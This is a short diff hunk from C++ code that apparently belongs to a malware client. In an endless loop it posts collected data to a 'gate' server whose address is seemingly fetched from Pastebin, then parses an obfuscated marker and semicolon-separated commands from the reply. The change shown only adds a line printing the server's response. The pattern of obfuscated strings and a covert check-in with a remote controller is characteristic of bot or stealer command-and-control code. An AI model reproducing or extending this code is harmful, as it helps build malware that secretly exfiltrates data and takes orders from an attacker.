@@ -69,6 +69,7 @@ public:
 		while (true) {
 			try {
 				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, "POST");
+				std::cout << responseFromGate;
 				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 					std::string random_str = Helpers::RandomString(10);
